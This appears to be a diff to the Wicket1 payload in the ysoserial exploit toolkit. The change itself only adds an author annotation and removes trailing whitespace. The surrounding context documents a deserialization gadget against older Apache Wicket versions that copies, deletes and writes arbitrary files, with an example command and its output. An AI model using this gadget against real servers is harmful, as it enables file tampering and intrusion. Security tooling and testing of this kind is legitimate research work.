@@ -11,6 +11,7 @@ import org.apache.wicket.util.upload.DiskFileItem;
 import org.apache.wicket.util.io.DeferredFileOutputStream;
 import org.apache.wicket.util.io.ThresholdingOutputStream;
 
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
@@ -23,10 +24,10 @@ import ysoserial.payloads.util.Reflections;
  * means that if the target is running less than Oracle Java 7 update 40
  * then the NULL byte attack is viable. Otherwise, copy and move attacks
  * always work.
- * 
+ *
  * This attack is valid for the 1.x and 6.x lines of Apache Wicket but
  * was fixed in 1.5.16 and 6.24.0 (released July 2016).
- * 
+ *
  *
  * Arguments:
  * - copyAndDelete;sourceFile;destDir
@@ -34,17 +35,18 @@ import ysoserial.payloads.util.Reflections;
  * - writeB64;destDir;base64-data
  * - writeOld;destFile;ascii-data
  * - writeOldB64;destFile;base64-data
- * 
+ *
  * Example:
  * Wicket1 "write;/tmp;blue lobster"
- * 
+ *
  * Result:
  * $ ls -l /tmp/
  * -rw-rw-r-- 1 albino_lobster albino_lobster   12 Jul 25 14:10 upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp
- * $ cat /tmp/upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp 
+ * $ cat /tmp/upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp
  * blue lobster
  */
 @Dependencies({"wicket-util:wicket-util:6.23"})
+@Authors({ Authors.JACOBAINES })
 public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
 
     public DiskFileItem getObject(String command) throws Exception {
@@ -54,7 +56,7 @@ public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
         if (parts.length != 3) {
         	throw new IllegalArgumentException("Bad command format.");
         }
-        
+
         if ("copyAndDelete".equals(parts[0])) {
             return copyAndDelete(parts[1], parts[2]);
         }
@@ -73,7 +75,7 @@ public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
         throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
     }
 
-	public void release(DiskFileItem obj) throws Exception {	
+	public void release(DiskFileItem obj) throws Exception {
 	}
 
     private static DiskFileItem copyAndDelete ( String copyAndDelete, String copyTo ) throws IOException, Exception {
